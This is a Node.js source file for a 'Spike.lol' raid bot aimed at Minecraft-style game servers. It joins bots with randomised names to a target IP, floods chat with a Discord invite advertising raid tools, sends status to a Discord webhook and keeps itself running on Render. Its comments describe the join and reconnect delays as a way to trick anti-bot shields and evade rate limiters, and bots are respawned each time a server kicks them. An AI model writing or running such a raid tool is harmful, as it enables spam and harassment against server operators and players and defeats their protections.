const { createSpikeBot } = require('./bot');
const http = require('http');

// Render Environment Variables (Direct Extraction)
const TARGET_IP = process.env.TARGET_IP;
const TARGET_PORT = process.env.TARGET_PORT ? parseInt(process.env.TARGET_PORT) : 25565;
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const BOT_PASSWORD = process.env.BOT_PASSWORD || "SpikePass123";

const spamMessages = [
    "SPIKE.LOL ON TOP! THIS SERVER RAID BY SPIKE.LOL FREE TOOLS AND MORE RAID SYSTEM BEST JOIN https://discord.gg/pT8RGGvtZg"
];

// Keep Render alive web server
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => res.writeHead(200).end('Spike Raid Bot is Active!')).listen(PORT);

async function sendWebhook(message) {
    if (!WEBHOOK_URL) return;
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
    } catch (e) {}
}

if (!TARGET_IP || TARGET_IP.includes('your-target-server')) {
    console.error("❌ ERROR: TARGET_IP sahi se set nahi hai Render Environment variables me!");
    process.exit(1);
}

let activeBots = [];
let isRaidActive = true;

console.log(`🚀 Starting Spike.lol Raid System targeting ${TARGET_IP}:${TARGET_PORT}`);
sendWebhook(`🚀 **Raid System Started!** Target: \`${TARGET_IP}:${TARGET_PORT}\``);

// 🛡️ Anti-Bot Shield Bypass Queue (Ek-ek karke smart join system)
function launchRaidBots() {
    if (!isRaidActive) return;

    let spawnedCount = 0;
    const joinInterval = setInterval(() => {
        if (!isRaidActive || spawnedCount >= 3) { // Safe limit: Max 3 bots concurrent
            clearInterval(joinInterval);
            return;
        }

        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
        const botName = `spikelol_${randomSuffix}`;

        // Config object passed to bot.js
        const botConfig = {
            target: { ip: TARGET_IP, port: TARGET_PORT },
            auth: { password: BOT_PASSWORD },
            spamMessages: spamMessages
        };

        try {
            const bot = createSpikeBot(botName, botConfig, sendWebhook);

            // Agar server kick kare ya shield detect kare, toh thoda lamba delay deke dobara bhejo
            bot.on('end', (reason) => {
                activeBots = activeBots.filter(b => b !== bot);
                if (isRaidActive) {
                    setTimeout(() => {
                        if (isRaidActive) {
                            const newSuffix = Math.floor(1000 + Math.random() * 9000);
                            const replacementBot = createSpikeBot(`spikelol_${newSuffix}`, botConfig, sendWebhook);
                            activeBots.push(replacementBot);
                        }
                    }, 8000); // 8 seconds cooldown to bypass anti-bot rate limiter
                }
            });

            activeBots.push(bot);
            spawnedCount++;
        } catch (e) {
            console.log("Connection error caught.");
        }
    }, 4000); // 4 seconds gap between each bot join to trick anti-bot shields
}

// Initial Launch
launchRaidBots();
